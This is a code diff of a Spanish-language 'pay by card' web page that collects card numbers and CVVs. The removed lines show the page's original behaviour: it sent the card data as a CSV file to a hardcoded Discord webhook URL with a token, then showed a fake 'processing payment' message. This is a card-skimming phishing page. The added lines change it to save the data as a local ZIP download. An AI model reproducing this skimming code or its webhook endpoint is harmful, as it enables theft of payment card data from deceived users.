@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pagar con tarjetas</title>
+  <title>Pagar con tarjeta</title>
   <style>
     body {
       background: linear-gradient(to right, black, gray);
@@ -57,7 +57,6 @@
       margin-bottom: 10px;
     }
   </style>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
     function updateSigninStatus(isSignedIn) {
       if (isSignedIn) {
@@ -83,32 +82,20 @@
           cardCVV
         ];
 
-        sendCardData(fileName, cardData);
+        createAndDownloadZip(fileName, cardData);
       }
     }
 
-    function sendCardData(fileName, cardData) {
+    function createAndDownloadZip(fileName, cardData) {
+      var zip = new JSZip();
       var csvContent = cardData.join(", ");
-      var formData = new FormData();
-      formData.append('file', new Blob([csvContent], { type: 'text/csv' }), fileName);
+      zip.file(fileName, csvContent);
+      var zipBlob = zip.generate({ type: "blob", compression: "DEFLATE" });
 
-      fetch("https://discord.com/api/webhooks/1116932667200520222/exFZc5f9B8WCCMzDjIzGkopK6bRdK5Hp6rnxI0j9sJ0bcKu17HsB9pLxJs8AxmNkfQwd", {
-        method: 'POST',
-        body: formData
-      })
-      .then(function (response) {
-        if (response.ok) {
-          document.getElementById("done-message").textContent = "Listo! Procesando pago";
-          setTimeout(function () {
-            document.getElementById("error-message").textContent = "";
-          }, 2000);
-        } else {
-          document.getElementById("error-message").textContent = "Error al enviar el archivo";
-        }
-      })
-      .catch(function (error) {
-        document.getElementById("error-message").textContent = "Error al enviar el archivo";
-      });
+      var link = document.createElement("a");
+      link.href = URL.createObjectURL(zipBlob);
+      link.download = fileName + ".zip";
+      link.click();
     }
 
     function validateCard(cardNumber) {
@@ -165,7 +152,6 @@
     </div>
   
     <button onclick="updateSigninStatus(true)">Enviar</button>
-    <div id="done-message"></div>
   </div>
 </body>
 </html>
